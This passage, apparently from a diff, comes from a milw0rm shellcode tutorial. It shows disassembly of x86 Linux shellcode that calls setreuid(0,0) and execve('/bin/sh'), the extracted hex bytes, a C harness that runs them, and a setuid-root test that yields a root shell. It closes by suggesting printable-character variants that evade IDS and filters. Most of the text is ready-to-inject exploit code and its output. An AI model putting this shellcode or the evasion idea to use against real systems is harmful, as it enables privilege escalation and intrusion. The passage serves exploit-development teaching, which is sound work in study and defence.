+ 80490a3:       88 43 07                mov    %al,0x7(%ebx)
+ 80490a6:       89 5b 08                mov    %ebx,0x8(%ebx)
+ 80490a9:       89 43 0c                mov    %eax,0xc(%ebx)
+ 80490ac:       31 c0                   xor    %eax,%eax
+ 80490ae:       b0 0b                   mov    $0xb,%al
+ 80490b0:       8d 4b 08                lea    0x8(%ebx),%ecx
+ 80490b3:       8d 53 0c                lea    0xc(%ebx),%edx
+ 80490b6:       cd 80                   int    $0x80
+
+080490b8 <do_call>:
+ 80490b8:       e8 e3 ff ff ff          call   80490a0 <jmp_back>
+
+080490bd <shell>:
+ 80490bd:       2f                      das
+ 80490be:       62 69 6e                bound  %ebp,0x6e(%ecx)
+ 80490c1:       2f                      das
+ 80490c2:       73 68                   jae    804912c <_end+0x5c>
+ 80490c4:       4e                      dec    %esi
+ 80490c5:       58                      pop    %eax
+ 80490c6:       58                      pop    %eax
+ 80490c7:       58                      pop    %eax
+ 80490c8:       58                      pop    %eax
+ 80490c9:       59                      pop    %ecx
+ 80490ca:       59                      pop    %ecx
+ 80490cb:       59                      pop    %ecx
+ 80490cc:       59                      pop    %ecx
+
+The machine code I get is:
+
+31 c0 b0 46 31 c9 31 db cd 80 eb 18 5b 31 c0 88 43 07 
+89 5b 08 89 43 0c 31 c0 b0 0b 8d 4b 08 8d 53 0c cd 80 
+e8 e3 ff ff ff 2f 62 69 6e 2f 73 68 4e 58 58 58 58 59 
+59 59 59
+
+We no longer need the NXXXXYYYY after /bin/sh as that was just to 
+make it easier on us and to reserve space, remove that end end up with:
+
+31 c0 b0 46 31 c9 31 db cd 80 eb 18 5b 31 c0 88 43 07 
+89 5b 08 89 43 0c 31 c0 b0 0b 8d 4b 08 8d 53 0c cd 80 
+e8 e3 ff ff ff 2f 62 69 6e 2f 73 68
+
+Now we have the code that can be injected, lets try it on our test.
+
+entropy@phalaris {~/asm/shellcode} cat shell_test.c
+
+char shellcode[] = "\x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b"\
+                   "\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0"\
+                   "\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff"\
+                   "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+int
+main (int argc, char **argv)
+{
+        int (*ret)();              /* ret is a function pointer */
+        ret = (int(*)())shellcode; /* ret points to our shellcode */
+                                   /* shellcode is type casted as a function */
+        (int)(*ret)();             /* execute as function shellcode[] */
+        exit(0);                   /* exit() */
+}
+
+entropy@phalaris {~/asm/shellcode} gcc shell_test.c -o shell_test
+
+entropy@phalaris {~/asm/shellcode} sudo chown root shell_test
+
+entropy@phalaris {~/asm/shellcode} sudo chmod 4750 shell_test
+
+entropy@phalaris {~/asm/shellcode} ./shell_test
+
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=6(disk),10(wheel),18(audio),100(users)
+
+sh-2.05b# whoami
+root
+sh-2.05b# exit
+exit
+
+entropy@phalaris {~/asm/shellcode} rm shell_test
+rm: remove write-protected regular file `shell_test'? y
+
+entropy@phalaris {~/asm/shellcode}
+
+Theres many ways to make this shell code smaller, and with shellcode the 
+smaller the better. You can also make this shellcode consist of printable 
+characters only, so it can slip through IDS and filters, but I'll save 
+this for another time.
+
+# milw0rm.com [2006-04-08]
